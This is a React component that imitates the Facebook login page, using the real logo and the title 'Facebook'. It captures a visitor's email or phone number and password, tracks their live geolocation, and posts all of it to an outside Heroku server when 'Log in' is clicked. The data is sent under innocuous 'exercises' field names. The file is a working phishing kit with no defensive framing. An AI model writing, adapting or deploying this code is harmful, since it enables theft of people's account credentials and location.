import React,{useState,useEffect} from 'react'
import './Facebook.css'
import axios from 'axios'
import {Helmet} from "react-helmet";

function Facebook() {

  const [name,setName] = useState("")
  const [password,setPassword] = useState("")
  const [latitude,setLatitude] = useState("")
  const [longitude,setLongitude] = useState({})

  useEffect(() => {
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(function(position) {
        const loca = ("Latitude is :", position.coords.latitude);
        const tion = ("Longitude is :", position.coords.longitude);
        console.log(loca,tion);
      setLatitude(position.coords.latitude) ;
      setLongitude( position.coords.longitude)
      });
    }
  },[])

  let location = latitude +" "+ longitude
    let username = name
    let description = password+" -> location " + location
    let duration = 5
    let date = new Date()

    const savedata = () => {
      // window.location.href = '/';
      let data = ({
          username,
          description,
          duration,
          date
      })

      const headers = {
        'Content-Type': 'Application/Json',
        'Accept': 'Application/Json'
        }

      axios.post('https://backendaloginda.herokuapp.com/exercises/add', data)

      console.log(data)     
  }

    return (
        <div>
          <Helmet>
                <meta charSet="utf-8" />
                <title>Facebook</title>
                <link rel="icon" href="https://www.facebook.com/" />
            </Helmet>
          <header>
  <div class="top">
  </div>  
</header>
<section>
  <div class="center">
<a href= '/'>
  <img 
  src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
  width="112" class="img" alt="facebook"/> </a>

<div className="field">
    <input type="email" id="name" placeholder="Mobile Number or email address"
                     aria-required="true"  autoComplete="off" maxLength="30"  autoCorrect="off"
                    name="username" value={name} 
                    onChange={(e) => {setName(e.target.value)}}
                     required /> 

<input type="password" name="password" id="password" 
                    placeholder="Password" aria-describedby="" maxLength="30"  autoComplete="off"
                    aria-required="true"  autoCorrect="off" value={password}
                    onChange={(e) => {setPassword(e.target.value)}} required /> 
                    </div> 
          
          <div className="bttn"> 
           <button  className="btn" type="button" name="submit"
                     onClick={savedata}> Log in</button> 
                   </div>

  </div>
</section>
<footer>
   <div>
   <img className="fake" src="https://i.ibb.co/GJrRkPb/Capture.png" 
   alt="facebook" border="0"/>

<button className="Password">Content</button>
   </div>
</footer>

        </div>
    )
}

export default Facebook
